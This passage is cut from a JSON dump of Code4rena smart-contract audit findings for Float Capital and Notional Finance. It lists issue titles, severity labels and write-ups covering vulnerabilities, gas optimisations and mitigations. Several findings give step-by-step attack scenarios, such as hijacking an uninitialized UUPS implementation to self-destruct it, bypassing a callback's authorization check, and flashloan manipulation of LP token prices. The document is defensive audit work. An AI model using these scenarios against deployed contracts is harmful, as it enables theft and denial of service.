batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0; // should probably be false         ## Tools Used  ## Recommended Mitigation Steps change the second instance of the following (on line 1207)    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][true] = 0   to    batched_amountSyntheticToken_toShiftAwayFrom_marketSide[marketIndex][false] = 0    p.s. confirmed by Jason of Floatcapital: \"Yes, that should definitely be false!\"  "}, {"title": "Oracle updates can be frontrun by stakers to gain a profit", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/4", "labels": ["bug", "0 (Non-critical)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Oracle updates can be frontrun by stakers to gain a profit"}, {"title": "Protocol requires a running bot in order to make sure trades are actually executed", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/3", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity"], "target": "2021-08-floatcapital-findings", "body": "Protocol requires a running bot in order to make sure trades are actually executed"}, {"title": "Admin and treasury change should be confirmed.", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/2", "labels": ["bug", "2 (Med Risk)", "sponsor disputed", "disagree with severity", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Admin and treasury change should be confirmed."}, {"title": "Missing input validation on many functions throughout the code", "html_url": "https://github.com/code-423n4/2021-08-floatcapital-findings/issues/1", "labels": ["bug", "1 (Low Risk)", "sponsor disputed", "disagree with severity", "float-wont-fix"], "target": "2021-08-floatcapital-findings", "body": "Missing input validation on many functions throughout the code"}, {"title": "Potential DOS in Contracts Inheriting `UUPSUpgradeable.sol`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/98", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  There are a number of contracts which inherit `UUPSUpgradeable.sol`, namely; `GovernanceAction.sol`, `PauseRouter.sol` and `NoteERC20.sol`. All these contracts are deployed using a proxy pattern whereby the implementation contract is used by the proxy contract for all its logic. The proxy contract will make delegate calls to the implementation contract. This helps to facilitate future upgrades by pointing the proxy contract to a new and upgraded implementation contract. However, if the implementation contract is left uninitialized, it is possible for any user to gain ownership of the `onlyOwner` role in the implementation contract for `NoteERC20.sol`. Once the user has ownership they are able to perform an upgrade of the implementation contract's logic contract and delegate call into any arbitrary contract, allowing them to self-destruct the proxy's implementation contract. Consequently, this will prevent all `NoteERC20.sol` interactions until a new implementation contract is deployed.  ## Proof of Concept  Initial information about this issue was found [here](https://forum.openzeppelin.com/t/security-advisory-initialize-uups-implementation-contracts/15301).  Consider the following scenario: - Notional finance deploys their contracts using their deployment scripts. These deployment scripts leave the implementation contracts uninitialized. Specifically the contract in question is `NoteERC20.sol`. - This allows any arbitrary user to call `initialize()` on the `NoteERC20.sol` implementation contract. - Once a user has gained control over `NoteERC20.sol`'s implementation contract, they can bypass the `_authorizeUpgrade` check used to restrict upgrades to the `onlyOwner` role. - The malicious user then calls `UUPSUpgradeable.upgradeToAndCall()` shown [here](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/proxy/utils/UUPSUpgradeable.sol#L40-L43) which in turn calls [this](https://github.com/code-423n4/2021-08-notional/blob/main/contracts/proxy/ERC1967/ERC1967Upgrade.sol#L77-L107) function. The new implementation contract then points to their own contract containing a self-destruct call in its fallback function. - As a result, the implementation contract will be self-destructed due the user controlled delegate call shown [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/utils/Address.sol#L163-L169), preventing all future calls to the `NoteERC20.sol` proxy contract until a new implementation contract has been deployed.  ## Tools Used  Manual code review  ## Recommended Mitigation Steps  Consider initializing the implementation contract for `NoteERC20.sol` and checking the correct permissions before deploying the proxy contract or performing any contract upgrades. This will help to ensure the implementation contract cannot be self-destructed.  "}, {"title": "Non-existent `nERC1155Interface.supportsInterface.selector`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/97", "labels": ["bug", "invalid", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Non-existent `nERC1155Interface.supportsInterface.selector`"}, {"title": "`StorageLayoutV1` Gas Optimisations", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/96", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `StorageLayoutV1.sol` contract is inherited by several contracts and represents a shared common state that ensures the slot layout of certain contracts are the same. It is possible to minimise the number of storage slots used by rearranging the state variables in the most efficient way.  ## Proof of Concept  https://github.com/code-423n4/2021-08-notional/blob/main/contracts/global/StorageLayoutV1.sol  ## Tools Used  Manual code review  ## Recommended Mitigation Steps  Arrange the `uint16`  and `bytes1` variables such that they fit into the same slot.  "}, {"title": "Missing SPDX Identifier", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/95", "labels": ["bug", "invalid", "0 (Non-critical)", "disagree with severity", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  There are several contracts missing SPDX identifiers which correctly license the contract for open source development: `MISOAccessFactory.sol` `MISOAccessControls.sol` `MISOAdminAccess.sol` `PointList.sol` `TokenList.sol` `MISOMasterChef.sol` `CalculationsSushiswap.sol` `MISOHelper.sol` `PairsHelper.sol` `USDC.sol`  ## Proof of Concept  Refer to listed contracts.  ## Tools Used  Compiler warnings  ## Recommended Mitigation Steps  Consider adding `// SPDX-License-Identifier: GPL-3.0-only` to the top of the aforementioned files.  "}, {"title": "No Transfer Ownership Pattern", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact The current ownership transfer process involves the current owner calling transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner\u2019s address into the owner\u2019s state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier.  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/Airdrop.sol#L9  ## Tools Used  None  ## Recommended Mitigation Steps  Implement zero address check and consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.   "}, {"title": "Lack of Zero Address Validation", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/93", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  There is currently no input validation done on the `Router.initialize()` and `NoteERC20.initialize()` functions, potentially leading to an initialized state where the contracts have no owner and the deployer needs to re-deploy the contract to have it working properly.  ## Proof of Concept  https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/Router.sol#L63-L92 https://github.com/code-423n4/2021-08-notional/blob/main/contracts/external/governance/NoteERC20.sol#L90-L108  ## Tools Used  Manual code review  ## Recommended Mitigation Steps  Perform zero address checks for the `owner_`, `pauseRouter_` and `pauseGuardian_` inputs to ensure the contract isn't initialized into an unexpected state.  "}, {"title": "Missing validation on latestRoundData", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/92", "labels": ["bug", "duplicate", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  a_delamo   # Vulnerability details  On `ExchangeRate.sol`, we are using `latestRoundData`, but there are no validations that the data is not stale.  The current code is:  ```solidity             (                 /* uint80 */,                 rate,                 /* uint256 */,                 /* uint256 */,                 /* uint80 */             ) = AggregatorV2V3Interface(rateOracle).latestRoundData();             require(rate > 0, \"ExchangeRate: invalid rate\"); ```  But is missing the checks to validate the data is stale   ```solidity (roundId, rawPrice,, updatedAt, answeredInRound) = AggregatorV2V3Interface(rateOracle).latestRoundData(); require(rawPrice > 0, \"Chainlink price <= 0\"); require(updateTime != 0, \"Incomplete round\"); require(answeredInRound >= roundId, \"Stale price\"); ```  More information: https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round    "}, {"title": "Replacing the assembly `extcodesize` checks for versions `>0.8.1`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/91", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Replacing the assembly `extcodesize` checks for versions `>0.8.1`"}, {"title": "Used a fixed or pragma that spans only a single `0.x.*`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/90", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Used a fixed or pragma that spans only a single `0.x.*`  Currently, the pragma `>0.7.0` is used in several contracts. However, since 0.7.0 and 0.8.0 has breaking changes, especially the safemath by default, the contracts could be semantically different when compiled via `0.7.*` and `0.8.*`.   "}, {"title": "Consider using assembly instead of the lengthy if statement in Router.sol", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/89", "labels": ["bug", "invalid", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Consider using assembly instead of the lengthy if statement in Router.sol"}, {"title": "Caching length in for loops", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/88", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Caching length in for loops  Consider a generic example of an array `arr` and the following loop:  ``` solidity for (uint i = 0; i < arr.length; i++) {     // do something that doesn't change arr.length } ```  In the above case, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra `sload` operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra `mload` operation (3 additional gas for each iteration except for the first).  This extra costs can be avoided by caching the array length (in stack):  ``` solidity uint length = arr.length; for (uint i = 0; i < length; i++) {     // do something that doesn't change arr.length } ```  In the above example, the `sload` or `mload` operation is only done once and subsequently replaced by a cheap `dupN` instruction.  This optimization is especially important if it is a storage array or if it is a lengthy for loop.  Note that the Yul based optimizer (not enabled by default; only relevant if you are using `--experimental-via-ir` or the equivalent in standard JSON) can sometimes do this caching automatically. However, this is likely not the case in your project.  ### Examples  Here are some examples where this can be applied (found using a simple grep)  ``` txt ./contracts/external/Views.sol:187:        for (uint256 i = 0; i < cashGroup.maxMarketIndex; i++) { ./contracts/external/actions/BatchAction.sol:42:        for (uint256 i; i < actions.length; i++) { ./contracts/external/actions/BatchAction.sol:120:        for (uint256 i; i < actions.length; i++) { ./contracts/external/actions/ERC1155Action.sol:62:        for (uint256 i; i < accounts.length; i++) { ./contracts/external/actions/ERC1155Action.sol:91:        for (uint256 i; i < portfolio.length; i++) { ./contracts/external/actions/ERC1155Action.sol:240:        for (uint256 i; i < ids.length; i++) { ./contracts/external/actions/InitializeMarketsAction.sol:121:        for (uint256 i = 1; i < nToken.portfolioState.storedAssets.length; i++) { ./contracts/external/actions/InitializeMarketsAction.sol:146:        for (uint256 i = 1; i < nToken.portfolioState.storedAssets.length; i++) { ./contracts/external/actions/InitializeMarketsAction.sol:537:        for (uint256 i; i < nToken.cashGroup.maxMarketIndex; i++) { ./contracts/external/actions/TradingAction.sol:81:        for (uint256 i; i < trades.length; i++) { ./contracts/external/actions/TradingAction.sol:123:        for (uint256 i; i < trades.length; i++) { ./contracts/external/actions/nTokenMintAction.sol:110:        for (uint256 marketIndex = nToken.cashGroup.maxMarketIndex; marketIndex > 0; marketIndex--) { ./contracts/external/actions/nTokenRedeemAction.sol:138:        for (uint256 i; i < markets.length; i++) { ./contracts/external/actions/nTokenRedeemAction.sol:222:        for (uint256 i; i < nToken.portfolioState.storedAssets.length; i++) { ./contracts/external/actions/nTokenRedeemAction.sol:265:        for (uint256 i; i < markets.length; i++) { ./contracts/external/adapters/CompoundToNotionalV2.sol:81:        for (uint256 i; i < notionalV2CollateralIds.length; i++) { ./contracts/external/governance/NoteERC20.sol:98:        for (uint256 i = 0; i < initialGrantAmount.length; i++) { ./contracts/internal/balances/BalanceHandler.sol:300:        for (uint256 i; i < settleAmounts.length; i++) { ./contracts/internal/liquidation/LiquidateCurrency.sol:31:        for (uint256 i; i < portfolio.length; i++) { ./contracts/internal/liquidation/LiquidateCurrency.sol:345:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/liquidation/LiquidateCurrency.sol:449:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/liquidation/LiquidateCurrency.sol:528:            for (uint256 i; i < markets.length; i++) { ./contracts/internal/liquidation/LiquidatefCash.sol:77:        for (uint256 i; i < portfolio.length; i++) { ./contracts/internal/liquidation/LiquidatefCash.sol:131:        for (uint256 i; i < fCashMaturities.length; i++) { ./contracts/internal/liquidation/LiquidatefCash.sol:232:        for (uint256 i; i < fCashMaturities.length; i++) { ./contracts/internal/liquidation/LiquidatefCash.sol:495:        for (uint256 i; i < assets.length; i++) { ./contracts/internal/markets/CashGroup.sol:297:        for (uint256 i; i < cashGroup.liquidityTokenHaircuts.length; i++) { ./contracts/internal/markets/CashGroup.sol:309:        for (uint256 i; i < cashGroup.rateScalars.length; i++) { ./contracts/internal/nTokenHandler.sol:279:        for (uint256 i; i < depositShares.length; i++) { ./contracts/internal/nTokenHandler.sol:306:        for (uint256 i; i < proportions.length; i++) { ./contracts/internal/nTokenHandler.sol:371:        for (; i < array1.length; i++) { ./contracts/internal/nTokenHandler.sol:494:            for (uint256 i; i < nToken.portfolioState.storedAssets.length; i++) { ./contracts/internal/portfolio/BitmapAssetsHandler.sol:96:        for (uint256 i; i < assets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:20:        for (uint256 i; i < assets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:40:        for (uint256 i; i < assetArray.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:129:        for (uint256 i; i < newAssets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:161:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:171:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:202:        for (uint256 i; i < portfolioState.newAssets.length; i++) { ./contracts/internal/portfolio/PortfolioHandler.sol:283:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/portfolio/TransferAssets.sol:47:        for (uint256 i; i < assets.length; i++) { ./contracts/internal/settlement/SettlePortfolioAssets.sol:32:        for (uint256 i = portfolioState.storedAssets.length; (i--) > 0;) { ./contracts/internal/settlement/SettlePortfolioAssets.sol:137:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/internal/valuation/AssetHandler.sol:231:        for (uint256 i = portfolioIndex; i < assets.length; i++) { ./contracts/internal/valuation/AssetHandler.sol:250:        for (; j < assets.length; j++) { ./contracts/mocks/BaseMockLiquidation.sol:52:        for (uint256 i = 0; i < cashGroup.maxMarketIndex; i++) { ./contracts/mocks/BaseMockLiquidation.sol:72:        for (uint256 i; i < portfolioState.storedAssets.length; i++) { ./contracts/mocks/MockFlashLender.sol:30:        for (uint256 i; i < assets.length; i++) { ./contracts/mocks/MockFlashLender.sol:39:        for (uint256 i; i < assets.length; i++) { ```   "}, {"title": "Upgrade to at least 0.8.4", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Upgrade to at least 0.8.4"}, {"title": "Liquidator can be liquidatee", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/86", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Liquidator can be liquidatee"}, {"title": "Liquidity token value can be manipulated", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/85", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The liquidity token value (`AssetHandler.getLiquidityTokenValue`) is the sum of the value of the individual claims on cash (underlying or rather cTokens) and fCash. The amount to redeem on each of these is computed as the LP token to redeem relative to the total LP tokens, see `AssetHandler.getCashClaims` / `AssetHandler.getHaircutCashClaims`:  ```solidity // @audit token.notional are the LP tokens to redeem assetCash = market.totalAssetCash.mul(token.notional).div(market.totalLiquidity); fCash = market.totalfCash.mul(token.notional).div(market.totalLiquidity); ```  This means the value depends on the **current market reserves** which can be manipulated. You're essentially computing a spot price (even though the individual values use a TWAP price) because you use the current market reserves which can be manipulated.  See the \"How do I tell if I\u2019m using spot price?\" section on [https://shouldiusespotpriceasmyoracle.com/](https://shouldiusespotpriceasmyoracle.com/). > However, by doing this you\u2019re actually incorporating the spot price because you\u2019re still dependent on the reserve balances of the pool. This is an extremely subtle detail, and more than one project has been caught by it. You can read more about this [footgun](https://cmichel.io/pricing-lp-tokens/) in this writeup by @cmichelio.  ## Impact The value of an LP token is computed as `assetCashClaim + assetRate.convertFromUnderlying( presentValue(fCashClaim) )` where `(assetCashClaim, fCashClaim)` depend on the current market reserves which can be manipulated by an attacker via flashloans. Therefore, an attacker trading large amounts in the market either increases or decreases the value of an LP token.  If the value decreases, they can try to liquidate users borrowing against their LP tokens / nTokens. If the value increases, they can borrow against it and potentially receive an under-collateralized borrow this way, making a profit.  The exact profitability of such an attack depends on the AMM as the initial reserve manipulation and restoring the reserves later incurs fees and slippage. In constant-product AMMs like Uniswap it's profitable and several projects have already been exploited by this, like [warp.finance](https://cmichel.io/pricing-lp-tokens/). However, Notional Finance uses a more complicated AMM and the contest was too short for me to do a more thorough analysis. It seems like a similar attack could be possible here as described by the developers when talking about a different context of using TWAP oracles: > \"Oracle rate protects against short term price manipulation. Time window will be set to a value on the order of minutes to hours. This is to protect fCash valuations from market manipulation. For example, a trader could use a flash loan to dump a large amount of cash into the market and depress interest rates. Since we value fCash in portfolios based on these rates, portfolio values will decrease and they may then be liquidated.\" - Market.sol L424  ## Recommendation Do not use the current market reserves to determine the value of LP tokens. Think about how to implement a TWAP oracle for the LP tokens themselves, instead of combining it from the two TWAPs of the claimables.   "}, {"title": "Use of `msg.value` in batch action", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/84", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "Use of `msg.value` in batch action"}, {"title": "ChainLink price data could be stale", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/83", "labels": ["bug", "duplicate", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2021-08-notional-findings", "body": "ChainLink price data could be stale"}, {"title": "`DateTime.getMarketIndex` bounds should be tighter", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/82", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details `DateTime.getMarketIndex` can be called with a `maxMarketIndex < 10` but the inner `DateTime.getTradedMarket(i)` function will revert for any values `i > 7`.  ## Impact \"Valid\" `maxMarketIndex` values above 7 will break and return with an error.  ## Recommended Mitigation Steps The upper bound on `maxMarketIndex` should be set to `7`.  "}, {"title": "`DateTime.isValidMarketMaturity` bounds should be tighter", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/81", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details `DateTime.isValidMarketMaturity` can be called with a `maxMarketIndex < 10` but the inner `DateTime.getTradedMarket(i)` function will revert for any values `i > 7`.  ## Impact \"Valid\" `maxMarketIndex` values above 7 will break and return with an error.  ## Recommended Mitigation Steps The upper bound on `maxMarketIndex` should be set to `7`.  "}, {"title": "`TokenHandler.safeTransferIn` does not work on non-standard compliant tokens like USDT", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/80", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `TokenHandler.safeTransferIn` function uses the standard `IERC20` function for the transfer call and proceeds with a `checkReturnCode` function to handle non-standard compliant tokens that don't return a return value. However, this does not work as calling `token.transferFrom(account, amount)` already reverts if the token does not return a return value, as `token`'s `IERC20.transferFrom` is defined to always return a `boolean`.  ## Impact When using any non-standard compliant token like USDT, the function will revert. Withdrawals for these tokens are broken, which is bad as `USDT` is a valid underlying for the `cUSDT` cToken.  ## Recommended Mitigation Steps We recommend using [OpenZeppelin\u2019s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens.  "}, {"title": "`TokenHandler.safeTransferOut` does not work on non-standard compliant tokens like USDT", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/79", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `TokenHandler.safeTransferOut` function uses the standard `IERC20` function for the transfer call and proceeds with a `checkReturnCode` function to handle non-standard compliant tokens that don't return a return value. However, this does not work as calling `token.transfer(account, amount)` already reverts if the token does not return a return value, as `token`'s `IERC20.transfer` is defined to always return a `boolean`.  ## Impact When using any non-standard compliant token like USDT, the function will revert. Deposits for these tokens are broken, which is bad as `USDT` is a valid underlying for the `cUSDT` cToken.  ## Recommended Mitigation Steps We recommend using [OpenZeppelin\u2019s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens.  "}, {"title": "`TokenHandler.transfer` wrong branch order", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/78", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `TokenHandler.transfer` should handle the `if (token.tokenType == TokenType.Ether)` case first, as if the token type is `Ether` but `netTransferExternal <= 0` it treats the token as an `ERC20` token and tries to call `ERC20` functions on it.   ## Impact Luckily, trying to call ERC20 functions on the invalid token address will revert which is the desired behavior.  ## Recommended Mitigation Steps We still recommend reordering the branches and adding a `netTransferExternal <= 0` check. The code becomes cleaner and it's more obvious that the transaction will fail.   "}, {"title": "`TokenHandler.setToken` ERC20 missing return value check", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/77", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `setToken` function performs an `ERC20.approve()` call but does not check the `success` return value. Some tokens do **not** revert if the approval failed but return `false` instead.  ## Impact Tokens that don't actually perform the approve and return `false` are still counted as a correct approve.  ## Recommended Mitigation Steps We recommend using [OpenZeppelin\u2019s `SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.1/contracts/token/ERC20/utils/SafeERC20.sol#L74) versions with the `safeApprove` function that handles the return value check as well as non-standard-compliant tokens.  "}, {"title": "NoteERC20.getPriorVotes includes current unclaimed incentives", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/76", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `NoteERC20.getPriorVotes` function is supposed to return the voting strength of an account at a specific block in the past. This should be a static value but it directly includes the _current_ unclaimed incentives due to the `getUnclaimedVotes(account)` call.  ## Impact Users that didn't even have tokens at the time of proposal creation but are now interested in voting on the proposal can farm unclaimed incentives and impact the outcome of the proposal.  ## Recommended Mitigation Steps Adding checkpoints for all unclaimed incentives would be the correct solution but was probably not done because it'd cost too much gas. It also needs to be ensured that incentives cannot be increased through flash-loaning of assets.  "}, {"title": "NoteERC20 _authorizeUpgrade not implemented", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/75", "labels": ["bug", "invalid", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-notional-findings", "body": "NoteERC20 _authorizeUpgrade not implemented"}, {"title": "NoteERC20 missing initial ownership event", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/74", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `NoteERC20.initialize` function does not emit an initial `OwnershipTransferred` event.  ## Recommended Mitigation Steps In `initialize`, emit `OwnershipTransferred(address(0), owner_)`.   "}, {"title": "Governor average block time is not up-to-date", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/73", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `GovernorAlpha.MIN_VOTING_PERIOD_BLOCKS = 6700` value indicates an average block time of 12.8956s which was correct a year ago, but at the moment a more accurate block time would be 13.2s, see [blocktime](https://etherscan.io/chart/blocktime).  ## Recommended Mitigation Steps Use a `MIN_VOTING_PERIOD_BLOCKS` of `6545`.  "}, {"title": "nTokenERC20Proxy emits events even when not success", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/72", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `nTokenERC20Proxy` functions emit events all the time, even if the return value from the inner call returns `false` indicating an unsuccessful action.  ## Impact An off-chain script scanning for `Transfer` or `Approval` events can be tricked into believing that an unsuccessful transfer was indeed successful. This happens in the `approve`, `transfer` and `transferFrom` functions.  ## Recommended Mitigation Steps Only emit evens on `success`.  "}, {"title": "Access restrictions on `NotionalV1ToNotionalV2.notionalCallback` can be bypassed", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/71", "labels": ["bug", "3 (High Risk)"], "target": "2021-08-notional-findings", "body": "Access restrictions on `NotionalV1ToNotionalV2.notionalCallback` can be bypassed"}, {"title": "Unclear decimals value in `cTokenAggregator`", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/70", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `cTokenAggregator.decimals` value is set to `18` but `cTokens` only have `8` decimals. It's unclear what this `decimals` field refers to.  ## Recommended Mitigation Steps If it should refer to the `cToken` decimals, it's wrong and should be set to `8`. This value is not used inside the contract but it's `public` and anyone can read it.    "}, {"title": "Access restrictions on `CompoundToNotionalV2.notionalCallback` can be bypassed", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/69", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `CompoundToNotionalV2.notionalCallback` is supposed to only be called from the verified contract that calls this callback but the access restrictions can be circumvented by simply providing `sender = this` as `sender` is a parameter of the function that can be chosen by the attacker.  ```solidity function notionalCallback(     address sender,     address account,     bytes calldata callbackData ) external returns (uint256) { // @audit sender can be passed in by the attacker require(sender == address(this), \"Unauthorized callback\"); ```  ## Impact An attacker can call the function passing in an arbitrary `account` whose tokens are then transferred to the contract. The `account` first has to approve this contract but this can happen with accounts that legitimately want to call the outer function and have to send a first transaction to approve the contract, but then an attacker frontruns the actual transaction.  It's at least a griefing attack: I can pass in a malicious `cTokenBorrow` that returns any token of my choice (through the `.underlying()` call) but whose `repayBorrowBehalf` is a no-op. This will lead to any of the victim's approved tokens becoming stuck in the contract, essentially burning them:  ```solidity // @audit using a malicious contract, this can be any token address underlyingToken = CTokenInterface(cTokenBorrow).underlying(); bool success = IERC20(underlyingToken).transferFrom(account, address(this), cTokenRepayAmount); require(success, \"Transfer of repayment failed\");  // Use the amount transferred to repay the borrow // @audit using a malicious contract, this can be a no-op uint code = CErc20Interface(cTokenBorrow).repayBorrowBehalf(account, cTokenRepayAmount); ```  Note that the assumption at the end of the function \"// When this exits a free collateral check will be triggered\" is not correct anymore but I couldn't find a way to make use of it to lead to an invalid account state.  ## Recommended Mitigation Steps Fix the authorization check.   "}, {"title": "`CompoundToNotionalV2.notionalCallback` ERC20 return values not checked", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/68", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": "# Handle  cmichel   # Vulnerability details  ## Vulnerability Details Some tokens (like USDT) don't correctly implement the EIP20 standard and their `transfer`/`transferFrom` function return `void` instead of a success boolean. Calling these functions with the correct EIP20 function signatures will always revert.  See `CompoundToNotionalV2.notionalCallback`'s `IERC20(underlyingToken).transferFrom` call.  ## Impact Tokens that don't correctly implement the latest EIP20 spec, like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value. As there is a `cToken` with `USDT` as the underlying this issue directly applies to the protocol.  ## Recommended Mitigation Steps We recommend using OpenZeppelin\u2019s `SafeERC20` versions with the `safeTransfer` and `safeTransferFrom` functions that handle the return value check as well as non-standard-compliant tokens.   "}, {"title": "`CompoundToNotionalV2.enableToken` ERC20 missing return value check", "html_url": "https://github.com/code-423n4/2021-08-notional-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-08-notional-findings", "body": 